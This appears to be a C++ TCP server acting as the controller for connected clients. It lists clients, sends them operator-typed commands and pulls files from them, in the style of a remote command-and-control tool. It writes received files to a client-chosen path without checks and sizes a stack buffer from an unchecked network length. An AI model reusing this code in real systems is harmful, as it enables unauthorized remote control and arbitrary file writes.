#include "server.h"

ssize_t recv_exactly(int fd, char* buf, size_t len)
{
    size_t total = 0;
    //Print ("Start recv_exactly");
    while (total < len)
    {
        ssize_t bytes_received = recv(fd, buf + total, len - total, 0);
        //Print ("buf: " + std::string(buf));
        if (bytes_received <= 0)
        {
            Print ("Error: recv failed");
            return -1;
        }
        if (!strncmp(buf, "ERR", 5))
        {
            Print ("Error: File open failed");
            return -1;
        }
        total += bytes_received;
    }
    //Print ("End recv_exactly");
    return (ssize_t)total;
}

void RecvFile(socket_t client_fd)
{
    //Print ("Start RecvFile");
    // 1. Filename length
    uint32_t name_len;
    if (recv_exactly(client_fd, (char*)&name_len, 4) < 0)
        return;

    //Print ("name_len: " + std::to_string(name_len));

    if(name_len <= 0)
    {
        Print ("Error in receiving file");
        return;
    }

    name_len = ntohl(name_len);
    Print ("name_len: " + std::to_string(name_len));

    // 2. Filename
    char filename[name_len + 1];
    if (recv_exactly(client_fd, filename, name_len) < 0)
        return;

    filename[name_len] = '\0';
    Print ("file name: " + std::string(filename));

    // 3. File size
    uint64_t file_size;
    if (recv_exactly(client_fd, (char*)&file_size, 8) < 0)
        return;

    file_size = be64toh(file_size);
    Print ("file size: " + std::to_string(file_size));

    // 4. File data
    int fd = open(filename, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0)
    {
        perror("Error: open failed."); 
        return;
    }

    char buf[65536] = {0};
    uint64_t total = 0;
    while (total < file_size)
    {
        size_t to_read = (file_size - total > sizeof(buf)) ? sizeof(buf) : (size_t)(file_size - total);
        ssize_t bytes_received = recv(client_fd, buf, to_read, 0);
        if (bytes_received <= 0)
        {
            perror("Error: recv failed.");
            break;
        }

        size_t total_written = 0;
        while (total_written < (size_t)bytes_received)
        {
            ssize_t bytes_written = write(fd, buf + total_written, bytes_received - total_written);
            if (bytes_written < 0)
            {
                perror("Error: write failed");
                break;
            }
            total_written += bytes_written;
        }
        total += bytes_received;
    }

    close(fd);

    char output[4096] = {0};
    sprintf(output, "Received: %s (%llu bytes)\n", filename, (unsigned long long)file_size);
    Print (std::string(output));
    //Print ("End RecvFile");
}

bool SendMsg(socket_t socket_fd, const char* data, size_t length) 
{
    Print ("Message to send: " + std::string(data));

    while (length > 0) 
    {
        int bytes_sent = send(socket_fd, data, static_cast<int>(length), 0);
        if (bytes_sent <= 0)
        {
            Print ("Error: send failed");
            return false;
        }

        //move pointer by sent bytes
        data += bytes_sent;
        //update length of unsent bytes
        length -= static_cast<size_t>(bytes_sent);
    }

    Print ("Returning true");

    return true;
}

std::string RecvMsg(socket_t client_fd)
{
    char buffer[4096] = {0};
    //memset (buffer, '\0', sizeof(buffer));
    std::string response = "";
    std::string prefix = "(client-" + std::to_string(client_fd) + ") ";

    int bytes_received = recv(client_fd, buffer, sizeof(buffer) - 1, 0);
    if (bytes_received > 0)
    {
        buffer[bytes_received] = '\0';

        response = std::string(buffer);

        Print (prefix + "Msg received: " + response + "\n");
    }
    return response;
}

void HandleAccept (socket_t server_fd)
{
    tid_t tid = get_tid();
    Print ("Thread ID: " + std::to_string(tid));
    //int cur_client_id = 1;
    while (serverUp) 
    {
        sockaddr_in client_address;
        socklen_t client_size = sizeof(client_address);

        socket_t client_fd = accept(
            server_fd,
            reinterpret_cast<sockaddr*>(&client_address),
            &client_size
        );

        if (client_fd < 0) 
        {
            Print ("Error: accept() failed\n");
            if (errno == EINTR)
                break;
            continue;
        }

        char client_ip[INET_ADDRSTRLEN] = {};
        inet_ntop(AF_INET, &client_address.sin_addr, client_ip, sizeof(client_ip));

        Print ("Client connected from: " + std::string(client_ip) + '\n');

        //char buffer[4096];
        //memset (buffer, '\0', sizeof(buffer));

        //int bytes_received = recv(client_fd, buffer, sizeof(buffer) - 1, 0);
        //buffer[bytes_received] = '\0';

        //std::string platform = std::string(buffer);
        //Print ("Client details: " + platform + "\n");
        std::string platform = RecvMsg (client_fd);

        //Create client object
        std::unique_ptr<Client> client(new Client);
        //client->id = cur_client_id++;
        client->fd = client_fd;
        client->ip = client_ip;
        client->os = platform;
        client->comments = "";

        clientmap[client_fd] = std::move(client);
    }
    Print ("Server exited.");
}

int main() 
{
    if (!StartUp())
        return 1;

    const unsigned short port = 50005;
    //const char* server_ip = "127.0.0.1";
    const char* server_ip = "172.18.114.232";

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) 
    {
        Print ("Error: socket() failed\n");
        return 1;
    }

    //signal(SIGINT, OnSIGINT);

    int reuse = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, reinterpret_cast<const char*>(&reuse), sizeof(reuse));

    sockaddr_in address;
    std::memset(&address, 0, sizeof(address));
    address.sin_family = AF_INET;
    //address.sin_addr.s_addr = INADDR_ANY;
    address.sin_addr.s_addr = inet_addr(server_ip);
    address.sin_port = htons(port);

    if (bind(server_fd, reinterpret_cast<sockaddr*>(&address), sizeof(address)) < 0) 
    {
        Print ("Error: bind failed\n");
        CLOSE_SOCKET(server_fd);
        return 1;
    }

    if (listen(server_fd, 10) < 0) 
    {
        Print ("Error: listen failed\n");
        CLOSE_SOCKET(server_fd);
        return 1;
    }

    Print ("Server listening on port " + std::to_string(port) + '\n');

    Print ("Server PID: " + std::to_string(getpid()));

    std::thread accept_thread(HandleAccept, server_fd);
    SLEEP(5);

    int choice;
    socket_t client_fd;
    while (true)
    {
        Print ("Choices:\n1. List Out Clients\n2. Send Command\n3. Recv File\n4. Send File\n5. Reset\n");
        Print ("Enter choice: ");
        std::cin >> choice;
        switch (choice)
        {
            case 1:
            {
                for (auto iter = clientmap.begin(); iter != clientmap.end(); iter++)
                {
                    Print (std::to_string(iter->first) + ": (" + iter->second->ip +
                        ", " + iter->second->os + 
                        ", " + iter->second->comments + 
                        ")\n");
                }
            }
            break;

            case 2:
            {
                //std::string msg = "Are you alive?";
                std::string cmd = "";
                Print ("Client Id: ");
                std::cin >> client_fd;
                Print ("Command: ");
                //std::getline (std::cin, msg);
                std::cin >> cmd;
                SendMsg(client_fd, cmd.c_str(), cmd.size());
                RecvMsg(client_fd);
            }
            break;

            case 3:
            {
                Print ("Client Id: ");
                std::cin >> client_fd;
                std::string cmd = "sfile";
                SendMsg(client_fd, cmd.c_str(), cmd.size());
                RecvFile(client_fd);
            }
            break;

            case 4:
            {
                //Print ("Client Id: ");
                //std::cin >> client_fd;
                //std::string cmd = "rfile";
                //SendMsg(client_fd, cmd.c_str(), cmd.size());
                //SendFile(client_fd, "server.log");
            }
            break;

            case 5:
            break;

            default:
            break;
        }
    }

    serverUp = false;

    //server_fd is no longer usable, unblocks accept()
    shutdown(server_fd, SHUT_RDWR);

    Print ("Waiting for thread to finish.");
    accept_thread.join();
    Print ("Thread joined.");

    CLOSE_SOCKET(server_fd);

    CleanUp();

    return 0;
}
